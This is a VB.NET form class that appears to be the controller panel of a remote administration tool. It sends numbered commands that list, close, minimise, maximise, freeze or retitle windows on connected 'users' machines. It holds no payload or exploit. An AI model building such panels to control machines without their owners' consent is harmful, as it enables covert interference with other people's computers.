Public Class Windowmanager

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Refreshing active windows...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|15")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Windowmanager")
        End Try
    End Sub

    Public Sub SplitData(ByVal Data As String)
        If Data = Nothing Then
            MsgBox("Couldn't recieve data. Please retry.", MsgBoxStyle.Exclamation)
            Exit Sub
        End If
        ListViewWindows.Items.Clear()
        Dim lines() = Data.Split({";;;"}, StringSplitOptions.None)
        For Each line In lines
            Dim parts() = line.Split({"|||"}, StringSplitOptions.None)
            Dim item = ListViewWindows.Items.Add(parts(0), 0)
            For i = 1 To Math.Min(parts.Length - 1, 2)
                Dim PIDcheck As String = parts(i)
                item.SubItems.Add(parts(i))
                If item.SubItems(1).Text.EndsWith("Normal") Then
                    item.ImageIndex = 0
                ElseIf item.SubItems(1).Text.EndsWith("Maximized") Then
                    item.ImageIndex = 1
                ElseIf item.SubItems(1).Text.EndsWith("Minimized") Then
                    item.ImageIndex = 2
                Else
                    item.ImageIndex = 0
                End If
            Next

        Next
        For Each item As ListViewItem In ListViewWindows.Items
            If (String.IsNullOrWhiteSpace(item.Text) Or String.IsNullOrEmpty(item.Text)) Then
                item.Remove()
            End If
        Next
    End Sub

    Private Sub RestoreWindowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestoreWindowToolStripMenuItem.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Restoring window...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewWindows.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewWindows.SelectedItems(0).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|16")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Windowmanager")
                End Try
            End If
        Else
            MsgBox("Select a window to restore.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub MinimizeWindowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MinimizeWindowToolStripMenuItem.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Minimized window...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewWindows.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewWindows.SelectedItems(0).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|17")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Windowmanager")
                End Try
            End If
        Else
            MsgBox("Select a window to minimize.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub MaximizeWindowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MaximizeWindowToolStripMenuItem.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Maximizing window...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewWindows.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewWindows.SelectedItems(0).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|18")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Windowmanager")
                End Try
            End If
        Else
            MsgBox("Select a window to maximize.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub CloseWindowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseWindowToolStripMenuItem.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Closing window...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewWindows.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewWindows.SelectedItems(0).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|19")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Windowmanager")
                End Try
            End If
        Else
            MsgBox("Select a window to close.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub FreezeWindowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FreezeWindowToolStripMenuItem.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Freezing window...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewWindows.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewWindows.SelectedItems(0).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|20")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Windowmanager")
                End Try
            End If
        Else
            MsgBox("Select a window to freeze.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub UnfreezeWindowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnfreezeWindowToolStripMenuItem.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Unfreezing window...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewWindows.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewWindows.SelectedItems(0).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|21")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Windowmanager")
                End Try
            End If
        Else
            MsgBox("Select a window to unfreeze.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub ChangeWindowTextToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChangeWindowTextToolStripMenuItem.Click
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewWindows.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    WindowmanagerTitleChanger.ShowDialog()
                Catch
                End Try
            End If
        Else
            MsgBox("Select a window to change the title.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub Windowmanager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ListViewWindows.Items.Clear()
    End Sub
End Class